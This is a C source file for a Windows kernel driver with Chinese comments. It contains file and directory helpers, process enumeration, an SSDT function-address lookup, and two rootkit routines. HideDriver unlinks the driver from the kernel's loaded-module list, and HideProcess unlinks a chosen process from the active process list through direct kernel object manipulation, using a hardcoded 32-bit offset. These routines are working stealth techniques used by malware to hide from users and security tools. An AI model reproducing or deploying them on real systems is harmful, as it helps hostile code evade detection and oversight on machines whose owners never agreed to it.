#include <ntifs.h>
#include <ntddk.h>
#include "ProcessFunc.h"
#include "CommonDef.h"
#include "DriverEntry.h"
//
//#include "DriverEntry.h"
//
#define MAX_PROCESS_COUNT  100000
#define PROCESS_QUERY_INFORMATION          (0x0400)  


NTSTATUS createFile(wchar_t * filepath,
					ULONG access,
					ULONG share,
					ULONG openModel,
					BOOLEAN isDir,
					HANDLE * hFile)
{
	NTSTATUS status = STATUS_SUCCESS;

	IO_STATUS_BLOCK StatusBlock = { 0 };
	ULONG           ulShareAccess = share;
	ULONG ulCreateOpt = FILE_SYNCHRONOUS_IO_NONALERT;

	UNICODE_STRING path;
	RtlInitUnicodeString(&path, filepath);

	// 1. 初始化OBJECT_ATTRIBUTES的内容
	OBJECT_ATTRIBUTES objAttrib = { 0 };
	ULONG ulAttributes = OBJ_CASE_INSENSITIVE/*不区分大小写*/ | OBJ_KERNEL_HANDLE/*内核句柄*/;
	InitializeObjectAttributes(&objAttrib,    // 返回初始化完毕的结构体
							   &path,      // 文件对象名称
							   ulAttributes,  // 对象属性
							   NULL, NULL);   // 一般为NULL

	// 2. 创建文件对象
	ulCreateOpt |= isDir ? FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;

	status = ZwCreateFile(hFile,                 // 返回文件句柄
						  access,				 // 文件操作描述
						  &objAttrib,            // OBJECT_ATTRIBUTES
						  &StatusBlock,          // 接受函数的操作结果
						  0,                     // 初始文件大小
						  FILE_ATTRIBUTE_NORMAL, // 新建文件的属性
						  ulShareAccess,         // 文件共享方式
						  openModel,			 // 文件存在则打开不存在则创建
						  ulCreateOpt,           // 打开操作的附加标志位
						  NULL,                  // 扩展属性区
						  0);                    // 扩展属性区长度
	return status;
}



NTSTATUS removeFile(wchar_t* filepath)
{

	UNICODE_STRING path;
	RtlInitUnicodeString(&path, filepath);

	// 1. 初始化OBJECT_ATTRIBUTES的内容
	OBJECT_ATTRIBUTES objAttrib = { 0 };
	ULONG             ulAttributes = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;
	InitializeObjectAttributes(&objAttrib,    // 返回初始化完毕的结构体
							   &path,		  // 文件对象名称
							   ulAttributes,  // 对象属性
							   NULL,          // 根目录(一般为NULL)
							   NULL);         // 安全属性(一般为NULL)
	// 2. 删除指定文件/文件夹
	return ZwDeleteFile(&objAttrib);
}

NTSTATUS firstFile(wchar_t* dir, HANDLE* hFind, FILE_BOTH_DIR_INFORMATION* fileInfo, int size)
{
	NTSTATUS status = STATUS_SUCCESS;
	IO_STATUS_BLOCK isb = { 0 };
	// 1. 打开目录
	status = createFile(dir,
						GENERIC_READ,
						FILE_SHARE_READ,
						FILE_OPEN_IF,
						TRUE,
						hFind);
	if (STATUS_SUCCESS != status)
		return status;

	// 第一次调用,获取所需缓冲区字节数
	status = ZwQueryDirectoryFile(*hFind, /*目录句柄*/
								  NULL, /*事件对象*/
								  NULL, /*完成通知例程*/
								  NULL, /*完成通知例程附加参数*/
								  &isb, /*IO状态*/
								  fileInfo, /*输出的文件信息*/
								  size,/*文件信息缓冲区的字节数*/
								  FileBothDirectoryInformation,/*获取信息的类型*/
								  TRUE,/*是否只获取第一个*/
								  0,
								  TRUE/*是否重新扫描目录*/);
	
	return status;
}

NTSTATUS nextFile(HANDLE hFind, FILE_BOTH_DIR_INFORMATION* fileInfo, int size)
{
	IO_STATUS_BLOCK isb = { 0 };
	// 第一次调用,获取所需缓冲区字节数
	return ZwQueryDirectoryFile(hFind, /*目录句柄*/
								NULL, /*事件对象*/
								NULL, /*完成通知例程*/
								NULL, /*完成通知例程附加参数*/
								&isb, /*IO状态*/
								fileInfo, /*输出的文件信息*/
								size,/*文件信息缓冲区的字节数*/
								FileBothDirectoryInformation,/*获取信息的类型*/
								TRUE,/*是否只获取第一个*/
								0,
								FALSE/*是否重新扫描目录*/);
}

void listDirFree(FILE_BOTH_DIR_INFORMATION* fileInfo)
{
	ExFreePool(fileInfo);
}


UINT32 APGetProcessNum()
{

	UINT32 ProcessCount = 0;

	for (UINT32 ProcessId = 0; ProcessId < 100000; ProcessId += 4)
	{
		NTSTATUS  Status = STATUS_UNSUCCESSFUL;
		PEPROCESS EProcess = NULL;
		Status = PsLookupProcessByProcessId((HANDLE)ProcessId, &EProcess);
		if (NT_SUCCESS(Status))
		{
			ProcessCount++;
			ObDereferenceObject(EProcess);   // 减引用计数
		}
	}
	

	return ProcessCount;
}

typedef NTSTATUS(*pfnZwQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);
PVOID  GetFunctionAddressByName(WCHAR *wzFunction)
{
	UNICODE_STRING uniFunction;
	PVOID AddrBase = NULL;

	if (wzFunction && wcslen(wzFunction) > 0)
	{
		RtlInitUnicodeString(&uniFunction, wzFunction);
		AddrBase = MmGetSystemRoutineAddress(&uniFunction);
	}

	return AddrBase;
}
NTSTATUS GetProcessImagePath(ULONG ulProcessId,WCHAR*  ProcessImagePath)
{
	NTSTATUS Status;
	HANDLE hProcess;
	PEPROCESS EProcess;
	ULONG ulRet;
	ULONG ulLength;
	PVOID Buffer;
	PUNICODE_STRING ProcessImagePathName;
	pfnZwQueryInformationProcess ZwQueryInformationProcessAddress = NULL;

	Status = PsLookupProcessByProcessId((HANDLE)ulProcessId, &EProcess);

	ZwQueryInformationProcessAddress = (pfnZwQueryInformationProcess)GetFunctionAddressByName(L"ZwQueryInformationProcess");

	if (ZwQueryInformationProcessAddress == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}

	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	Status = ObOpenObjectByPointer(EProcess,
		OBJ_KERNEL_HANDLE,
		NULL,
		GENERIC_READ,
		*PsProcessType,
		KernelMode,
		&hProcess);


	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	Status = ZwQueryInformationProcessAddress(hProcess,
		ProcessImageFileName,
		NULL,
		0,
		&ulRet);


	if (STATUS_INFO_LENGTH_MISMATCH != Status)
	{
		return Status;

	}

	Buffer = ExAllocatePoolWithTag(PagedPool, ulRet, 'itnA');

	ulLength = ulRet;

	if (NULL == Buffer)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	Status = ZwQueryInformationProcessAddress(hProcess,
		ProcessImageFileName,
		Buffer,
		ulLength,
		&ulRet);

	if (NT_SUCCESS(Status))
	{
		ProcessImagePathName = (PUNICODE_STRING)Buffer;
		wcscpy(ProcessImagePath, ProcessImagePathName->Buffer);
	}

	ZwClose(hProcess);
	ExFreePool(Buffer);
	return Status;
}

int HideDriver(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING uniDriverName)
{
	//_asm int 3;
	PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
	PLDR_DATA_TABLE_ENTRY fristentry = entry;
	while ((PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != fristentry)
	{
		if (entry->FullDllName.Buffer != 0)
		{
			if (RtlCompareUnicodeString(uniDriverName,
				&(entry->BaseDllName), FALSE) == 0)
			{
				DbgPrint("隐藏驱动 %ws 成功\n", entry->BaseDllName.Buffer);
				//修改Flink和Blink，跳过隐藏的驱动
				*((ULONG*)entry->InLoadOrderLinks.Blink) =
					(ULONG)entry->InLoadOrderLinks.Flink;
				entry->InLoadOrderLinks.Flink->Blink =
					entry->InLoadOrderLinks.Blink;

				entry->InLoadOrderLinks.Flink = (LIST_ENTRY*)
					&(entry->InLoadOrderLinks.Flink);
				entry->InLoadOrderLinks.Blink = (LIST_ENTRY*)
					&(entry->InLoadOrderLinks.Flink);
				return 1;
				break;
			}
		}
		//链表往前走
		entry = (PLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
	}
	return 0;
}


LONG GetFunticonAddr(PSSDTEntry KeServiceDescriptorTable, LONG lgSsdtIndex)
{
	LONG lgSsdtAddr = 0;
	//获取SSDT表的基址  
	lgSsdtAddr = (LONG)KeServiceDescriptorTable->ServiceTableBase;

	PLONG plgSsdtFunAddr = 0;
	//获取内核函数的地址指针  
	plgSsdtFunAddr = (PLONG)(lgSsdtAddr + lgSsdtIndex * 4);

	//返回内核函数的地址  
	return (*plgSsdtFunAddr);
}
void HideProcess(ULONG hidePID)
{
	// 1. 获取当前进程对象
	ULONG_PTR proc = (ULONG_PTR)PsGetCurrentProcess();
	// 2. 获取进程对象内的当前活动进程链表
	LIST_ENTRY* pProcList = (LIST_ENTRY*)(proc + 0xB8);
	LIST_ENTRY* listBegin = pProcList;
	// 开始遍历
	do {
		proc = (ULONG_PTR)pProcList - 0xB8;
		// 获取进程ID,进程路径,EPROCESS.

		ULONG pid = (ULONG)PsGetProcessId((PEPROCESS)proc); //*(ULONG*)(proc + 0xB4);
		if (pid == hidePID)
		{
			CHAR* path = PsGetProcessImageFileName((PEPROCESS)proc);//(CHAR*)proc + 0x16c;
			DbgPrint("隐藏进程 %s 成功\n", path);
			*((ULONG*)pProcList->Blink) =
				(ULONG)pProcList->Flink;
			pProcList->Flink->Blink =
				pProcList->Blink;

			pProcList->Flink = (LIST_ENTRY*)
				&(pProcList->Flink);
			pProcList->Blink = (LIST_ENTRY*)
				&(pProcList->Flink);
			return;
		}

		// 得到进程链表的下一个.
		pProcList = pProcList->Flink;
	} while (pProcList != listBegin);

}
NTSTATUS readFile(HANDLE hFile,
	ULONG offsetLow,
	ULONG offsetHig,
	ULONG sizeToRead,
	PVOID pBuff,
	ULONG* read)
{
	NTSTATUS status;
	IO_STATUS_BLOCK isb = { 0 };
	LARGE_INTEGER offset;
	// 设置要读取的文件偏移
	offset.HighPart = offsetHig;
	offset.LowPart = offsetLow;

	status = ZwReadFile(hFile,/*文件句柄*/
		NULL,/*事件对象,用于异步IO*/
		NULL,/*APC的完成通知例程:用于异步IO*/
		NULL,/*完成通知例程序的附加参数*/
		&isb,/*IO状态*/
		pBuff,/*保存文件数据的缓冲区*/
		sizeToRead,/*要读取的字节数*/
		&offset,/*要读取的文件位置*/
		NULL);
	if (status == STATUS_SUCCESS)
		*read = isb.Information;
	return status;
}